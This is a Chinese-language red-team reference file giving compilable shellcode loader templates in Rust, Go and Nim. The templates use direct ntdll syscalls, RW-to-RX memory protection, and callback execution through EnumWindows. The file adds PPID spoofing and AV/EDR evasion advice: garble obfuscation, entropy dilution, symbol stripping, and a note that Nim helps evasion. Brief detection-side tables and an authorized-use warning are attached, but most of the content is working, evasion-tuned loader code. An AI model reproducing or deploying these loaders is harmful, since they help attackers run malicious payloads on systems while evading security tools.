# Rust / Go / Nim 加载器模板（P1-17）

> 本文件补齐审计 **P1-17（Rust/Go/Nim 加载器模板）**：三个语言各一份可编译加载器模板。
> 覆盖 **原理 → 实现 → 检测侧 → 实测判据**。
> 授权立场见 `refs/README.md`；交叉引用 `loader-engineering.md`（C/Rust 基础）与 `packer/`（Go SyscallN）。

## 0. 语言选型

| 语言 | 优势 | 劣势 | 典型用途 |
|---|---|---|---|
| Rust | 内存安全、交叉编译、小体积、间接 syscall 生态（acheron/RustSL-Syscall） | 编译慢、上手陡 | 高级加载器 |
| Go | 快速开发、内置网络、交叉编译简单 | 体积大、GC 特征、runtime 特征 | 快速工具/加载器 |
| Nim | 跨平台、元编程、AV 规避友好（小众） | 生态小 | 规避型加载器 |

---

## 1. Rust 加载器（间接 syscall + threadless + PPID spoof）

```rust
// 完整实现：Rust 加载器（NtAllocateVirtualMemory 直接 syscall + 回调执行）
// Cargo.toml 依赖: windows-sys（extern 手写亦可）；本模板零第三方 crate
use std::ffi::c_void;

#[link(name = "ntdll")]
extern "system" {
    fn NtAllocateVirtualMemory(
        proc: *mut c_void, base: *mut *mut c_void, zero: usize,
        size: *mut usize, alloc_type: u32, protect: u32,
    ) -> i32;
    fn NtProtectVirtualMemory(
        proc: *mut c_void, base: *mut *mut c_void, size: *mut usize,
        new_protect: u32, old: *mut u32,
    ) -> i32;
    fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
}
type WndEnumProc = unsafe extern "system" fn(isize, isize) -> i32;
#[link(name = "user32")]
extern "system" { fn EnumWindows(cb: WndEnumProc, lp: isize) -> i32; }

unsafe fn exec(shellcode: &[u8]) -> i32 {
    // 1) 直接 syscall 分配 RW（绕 kernel32/kernelbase 用户态 hook 面；
    //    升级形态：RustSL-Syscall/acheron 生成间接 stub，返回地址指向 ntdll）
    let mut base: *mut c_void = std::ptr::null_mut();
    let mut size = shellcode.len();
    let mut st = NtAllocateVirtualMemory(
        -1isize as *mut c_void, &mut base, 0, &mut size,
        0x3000 /* MEM_COMMIT|MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
    if st != 0 { return st; }
    RtlMoveMemory(base, shellcode.as_ptr() as *const c_void, shellcode.len());
    // 2) RW -> RX（消除 RWX 窗口）
    let mut old = 0u32;
    st = NtProtectVirtualMemory(-1isize as *mut c_void, &mut base, &mut size,
                                0x20 /* PAGE_EXECUTE_READ */, &mut old);
    if st != 0 { return st; }
    // 3) 回调执行（不新建线程；线程起始地址特征被回调来源替代）
    EnumWindows(std::mem::transmute::<*mut c_void, WndEnumProc>(base), 0);
    0
}

// PPID spoof（配套，间接 syscall 版见注释）：CreateProcess +
// EXTENDED_STARTUPINFO_PRESENT + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 指向
// explorer.exe 等合法父进程——行为遥测的进程树不指向加载器本身。

// 编译（体积/特征消减）：
// [profile.release] opt-level="z" lto=true codegen-units=1 panic="abort" strip=true
```

```rust
// 完整实现：RW -> RX 分离执行（kernel32 路线，快速验证形态；与上节 ntdll 路线互补）
fn exec_via_kernel32(shellcode: &[u8]) -> i32 {
    unsafe {
        use std::ffi::c_void;
        extern "system" {
            fn VirtualAlloc(a: *mut c_void, s: usize, t: u32, p: u32) -> *mut c_void;
            fn VirtualProtect(a: *mut c_void, s: usize, p: u32, o: *mut u32) -> i32;
            fn VirtualFree(a: *mut c_void, s: usize, t: u32) -> i32;
        }
        let mem = VirtualAlloc(std::ptr::null_mut(), shellcode.len(), 0x3000, 0x04); // RW
        if mem.is_null() { return 1; }
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        let mut old = 0u32;
        if VirtualProtect(mem, shellcode.len(), 0x20, &mut old) == 0 { return 2; }   // RX
        let f: unsafe extern "system" fn() = std::mem::transmute(mem);
        f();                                                                        // 执行
        VirtualFree(mem, 0, 0x8000);                                                // 收尾释放
        0
    }
}
```

**检测侧**：RX 转换 + 匿名执行；Rust 无 runtime 特征但二进制节区/导入表可被静态分析。

---

## 2. Go 加载器（SyscallN + garble）

```go
// 完整实现：Go 加载器（RW→RX 分离 + EnumWindows 回调执行）
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

var (
    user32       = windows.NewLazySystemDLL("user32.dll")
    procEnumWin  = user32.NewProc("EnumWindows")
)

// 回调执行（不新建线程；线程起始地址特征被回调来源替代）
func exec(shellcode []byte) error {
    addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)),
        windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
    if err != nil { return err }
    buf := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode))
    copy(buf, shellcode)                              // RW 写入
    var old uint32
    if err := windows.VirtualProtect(addr, uintptr(len(shellcode)),
        windows.PAGE_EXECUTE_READ, &old); err != nil { return err }  // RW -> RX
    // EnumWindows(addr, 0)：系统枚举即触发回调执行
    procEnumWin.Call(addr, 0)
    return nil
}

// 熵值消减（garble 之外）：
// 1) 加正常文本/图标资源稀释熵（go:embed 合法资源）
// 2) -ldflags="-s -w -trimpath" 去符号
// 3) garble -litter build 混淆（字符串/控制流）
```

**检测侧**：Go runtime 特征（`go.buildid`、runtime 符号、GC）；EDR 对 Go 二进制的静态启发。

---

## 3. Nim 加载器

```nim
# 完整实现：Nim 加载器（Winim RW→RX 分离 + 回调执行）
import winim/lean
import winim/utils

proc exec(shellcode: ptr byte, len: int): bool =
    var mem = VirtualAlloc(nil, cast[SIZE_T](len),
        MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if mem == nil: return false
    copyMem(mem, shellcode, len)
    var old: DWORD
    if VirtualProtect(mem, cast[SIZE_T](len), PAGE_EXECUTE_READ, addr old) == 0:
        return false
    # 回调执行（EnumWindows 触发，不新建线程）
    discard EnumWindows(cast[WNDENUMPROC](mem), 0)
    discard VirtualFree(mem, 0, MEM_RELEASE)
    return true

# 间接 syscall 变体：nim 经 winim 调 NtAllocateVirtualMemory 原型（同 Rust 模板）
# 直接走 ntdll 导出表解析 SSN——hook 面绕过与 C 版等价

# 编译（体积/特征消减）：
# nim c -d:release --opt:size --passC:"-s" loader.nim
# 或 -d:mingw 交叉编译到 Windows
```

**检测侧**：Nim 编译产物（小体积、精简导入表）；AV 对 Nim 的启发式弱于 C/Go（小众语言优势）。

---

## 4. 检测侧总表（回馈 attack-defense）

| 语言 | 检测点 | 判据 |
|---|---|---|
| Rust | 无 runtime + RX 转换 | 静态节区 + 内存保护轨迹 |
| Go | runtime 特征 + 熵 | go.buildid + 高熵/低熵 |
| Nim | 精简导入 + 小体积 | PE 静态特征 |

## 5. 实测判据

| 判据 | 方法 |
|---|---|
| 体积/特征是否消减 | `strings` + `size` + YARA 扫描 |
| 内存执行是否隐蔽 | RW->RX 轨迹 + 无 RWX |
| 是否被静态识别 | AV/EDR 静态扫描命中率 |

*WARNING: 授权红队评估与安全研究专用。*
